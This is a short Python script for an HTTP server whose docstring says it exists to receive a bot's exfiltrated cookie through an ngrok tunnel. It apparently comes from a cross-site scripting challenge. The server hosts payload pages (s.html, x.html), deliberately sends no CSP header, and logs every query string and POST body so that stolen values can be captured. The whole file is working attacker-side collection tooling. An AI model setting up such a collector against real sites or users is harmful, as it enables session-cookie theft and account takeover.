#!/usr/bin/env python3
"""
Minimal HTTP server that logs every request + query string.

Run it locally (default port 8000) and point something like `ngrok http 8000`
at it to obtain a temporary HTTPS endpoint for exfiltrating the bot's cookie.
"""

import argparse
import datetime as dt
import http.server
import socketserver
import urllib.parse
from typing import Optional


class QueryLoggerHandler(http.server.BaseHTTPRequestHandler):
    server_version = "QueryLogger/1.0"

    def log_message(self, format: str, *args) -> None:  # noqa: A003
        # Keep default stdout logging quiet; we emit structured lines instead.
        return

    def _write_log(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        timestamp = dt.datetime.utcnow().isoformat()
        print(f"[{timestamp}] {self.command} {self.path}")
        if params:
            for key, values in params.items():
                for value in values:
                    print(f"  - {key} = {value}")
        else:
            print("  (no query params)")

    def _send_ok(self) -> None:
        body = b"logged\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        # Serve HTML files if requested
        for filename in ['s.html', 'x.html']:
            if self.path == f'/{filename}' or self.path.startswith(f'/{filename}?'):
                try:
                    with open(filename, 'rb') as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(content)))
                    # No CSP header - allow everything
                    self.end_headers()
                    self.wfile.write(content)
                    return
                except FileNotFoundError:
                    pass

        self._write_log()
        self._send_ok()

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("content-length", 0))
        data = self.rfile.read(length) if length else b""
        parsed = self.path + f" body={data!r}"
        print(f"[POST body] {parsed}")
        self._send_ok()


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Tiny query-logging server.")
    parser.add_argument(
        "--port",
        type=int,
        default=8000,
        help="Port to bind on (default: 8000).",
    )
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> None:
    args = parse_args(argv)
    with socketserver.TCPServer(("", args.port), QueryLoggerHandler) as httpd:
        print(f"[+] Listening on 0.0.0.0:{args.port}")
        print(f"[+] Use `ngrok http {args.port}` (or similar) to expose via HTTPS.")
        httpd.serve_forever()


if __name__ == "__main__":
    main()
